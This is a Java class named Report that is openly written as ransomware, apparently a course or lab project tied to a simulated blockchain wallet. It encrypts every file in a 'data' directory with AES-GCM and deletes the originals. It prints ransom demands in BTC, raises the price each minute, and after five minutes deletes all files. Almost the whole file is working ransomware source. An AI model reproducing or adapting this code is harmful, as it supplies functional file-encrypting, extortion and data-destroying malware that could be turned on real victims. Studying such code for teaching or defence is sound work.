package report;

import blockchain.Network;
import blockchain.Wallet;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.nio.file.Paths;
import java.security.NoSuchAlgorithmException;
import java.util.*;

public class Report implements IReport {
    // AES - Cryptography Params
    private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
    private static final int TAG_LENGTH_BIT = 128;
    private static final int IV_LENGTH_BYTE = 12;
    // Attacker
    private final Wallet wallet;
    private final double initialBalance;
    // Ransomware Params
    private final File directory;
    private SecretKey secretKey;
    private byte[] nonce;
    private boolean isEncrypted;
    private double amount;
    private int minute;


    public Report() {
        this.isEncrypted = false;

        // Attacker
        this.wallet = new Wallet();
        initialBalance = wallet.getBalance();

        // Ransomware Params
        this.directory = new File(String.valueOf(Paths.get("data").toAbsolutePath()));
        this.isEncrypted = false;
        this.amount = 0.02755;
        this.minute = 0;

        // AES - Cryptography Params
        try {
            this.nonce = AESCryptoUtils.getRandomNonce(IV_LENGTH_BYTE);
            this.secretKey = AESCryptoUtils.getAESKey();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
    }

    public static byte[] encrypt(byte[] pText, SecretKey secret, byte[] iv) throws Exception {

        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
        cipher.init(Cipher.ENCRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
        return cipher.doFinal(pText);
    }

    public static byte[] decrypt(byte[] cText, SecretKey secret, byte[] iv) throws Exception {

        Cipher cipher = Cipher.getInstance(ENCRYPT_ALGO);
        cipher.init(Cipher.DECRYPT_MODE, secret, new GCMParameterSpec(TAG_LENGTH_BIT, iv));
        return cipher.doFinal(cText);
    }

    private static byte[] readContentIntoByteArray(File file) {
        FileInputStream fileInputStream;
        byte[] bFile = new byte[(int) file.length()];
        try {
            //convert file into byte[]
            fileInputStream = new FileInputStream(file);
            fileInputStream.read(bFile);
            fileInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return bFile;
    }

    @Override
    public void checkPayment() throws Exception {
        if (isEncrypted) {
            if ((wallet.getBalance() >= (this.initialBalance + amount)) && Network.getInstance().isChainValid()) {
                System.out.println("Transaction successful! Your files will be decrypted.");
                startDecryption();
            } else {
                System.out.println("You need to pay me the full amount!");
                System.out.format("To decrypt your files, I need %.5f more BTC!\n", (amount - wallet.getBalance()));
            }
        } else {
            System.out.println("What payment do you want to check? Have you tried launching http://www.trust-me.mcg/report.jar?");
        }
    }

    @Override
    public void startEncryption() throws Exception {
        if (!isEncrypted) {
            // Arraylist of all files in said directory
            List<File> files = new ArrayList<>();

            for (File fileEntry : Objects.requireNonNull(directory.listFiles())) {
                if (!fileEntry.getName().endsWith(".mcg"))
                    files.add(fileEntry);
            }

            // Read files into byte[] for encryption
            for (File f : files) {
                byte[] decrFile = readContentIntoByteArray(f);
                byte[] encrFile = encrypt(decrFile, secretKey, nonce);

                try (FileOutputStream fos = new FileOutputStream(f.getAbsolutePath() + ".mcg")) {
                    fos.write(encrFile);
                }
                f.delete();
            }

            isEncrypted = true;
            startTimer();

            System.out.println("Oops, your files have been encrypted. With a payment of 0.02755 BTC all files will be decrypted.");
        } else {
            System.out.format("Your files already have been encrypted. Pay %.5f BTC to start the decryption.\n", amount);
        }
    }

    @Override
    public void startDecryption() throws Exception {
        if (isEncrypted) {
            List<File> files = new ArrayList<>();

            for (File fileEntry : Objects.requireNonNull(directory.listFiles())) {
                if (fileEntry.getName().endsWith(".mcg"))
                    files.add(fileEntry);
            }

            // Read files into byte[] for decryption
            for (File f : files) {
                byte[] encrFile = readContentIntoByteArray(f);
                byte[] decrFile = decrypt(encrFile, secretKey, nonce);

                try (FileOutputStream fos = new FileOutputStream(f.getAbsolutePath().split(".mcg")[0])) {
                    fos.write(decrFile);
                }
                f.delete();
            }
            isEncrypted = false;
        }
    }

    private void startTimer() {
        Timer timer = new Timer();

        timer.schedule(new TimerTask() {
            public void run() {
                switch (minute) {
                    case 1, 2, 3 -> {
                        setAmount(amount + 0.01);
                        System.out.format("Amount to pay increased by 0,01 to %.5f BTC.\n", amount);
                    }
                    case 4 -> {
                        setAmount(amount + 0.01);
                        System.out.format("Pay %.5f BTC immediately or your files will be irrevocably deleted.\n", amount);
                    }
                    case 5 -> {
                        System.out.println("Now your files will be irrevocably deleted.");
                        deleteAllFiles();
                        timer.cancel();
                        System.exit(0);
                    }
                    default -> {
                    }
                }
                minute++;
            }
        }, 0, 60 * 1000);
    }

    private void deleteAllFiles() {
        List<File> files = new ArrayList<>(Arrays.asList(Objects.requireNonNull(directory.listFiles())));

        for (File f : files) {
            f.delete();
        }
    }


    public double getAmount() {
        return amount;
    }

    public void setAmount(double amount) {
        this.amount = amount;
    }

    public Wallet getWallet() {
        return wallet;
    }
}
